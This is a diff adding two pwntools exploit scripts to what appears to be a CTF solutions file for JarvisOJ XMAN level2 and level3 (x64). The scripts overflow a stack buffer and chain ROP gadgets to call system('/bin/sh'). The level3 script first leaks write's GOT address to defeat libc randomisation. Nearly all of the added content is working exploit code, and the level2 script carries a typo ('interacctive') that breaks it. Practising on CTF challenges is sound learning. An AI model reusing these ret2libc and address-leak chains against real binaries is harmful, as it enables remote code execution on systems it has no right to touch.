@@ -391,7 +391,21 @@
 
   
 
-  
+* #### [XMAN]level2(x64)
+
+   ```python
+   from pwn import *
+   r = remote('pwn2.jarvisoj.com', 9882)
+   sys_addr = 0x4004C0
+   pop_rdi_ret = 0x4006b3
+   binsh = 0x600A90
+   padding = 'a' * (0x80 + 0x8)
+   payload = padding + p64(pop_rdi_ret) + p64(binsh) + p64(sys_addr)
+   r.sendline(payload)
+   r.interacctive()
+   ```
+
+   
 
 * ####  [XMAN]level3
 
@@ -432,6 +446,48 @@
      r.sendline(payload2)
      r.interactive()
      #CTF{d85346df5770f56f69025bc3f5f1d3d0}
+   ```
+
+* #### [XMAN]level3(x64)
+
+   ```python
+   from pwn import *
+   r = remote('pwn2.jarvisoj.com', 9883)
+   elf = ELF('./level3_x64')
+   libc = ELF('./libc-2.19.so')
+   
+   pwn_addr = 0x4005E6
+   sys_libc = libc.symbols['system']
+   write_libc = libc.symbols['write']
+   binsh_libc = libc.search('/bin/sh').next()
+   
+   write_plt = elf.plt['write']
+   write_got = elf.got['write']
+   
+   pop_rdi_ret = 0x4006b3
+   pop_rsi_p_r_ret = 0x4006b1
+   padding = 'a' * (0x80 + 0x8)
+   
+   payload = padding
+   payload += p64(pop_rdi_ret) + p64(1)
+   payload += p64(pop_rsi_p_r_ret) + p64(write_got) + p64(8)
+   payload += p64(write_plt)
+   payload += p64(pwn_addr)
+   
+   r.recvuntil('Input:\n')
+   r.sendline(payload)
+   leak_addr = u64(r.recv(8))
+   #print(hex(leak_addr))
+   
+   libc_base = leak_addr - write_libc
+   binsh = binsh_libc + libc_base
+   system = sys_libc + libc_base
+   
+   payload2 = padding + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
+   r.recvuntil('Input:\n')
+   r.sendline(payload2)
+   r.interactive()
+   
    ```
 
    
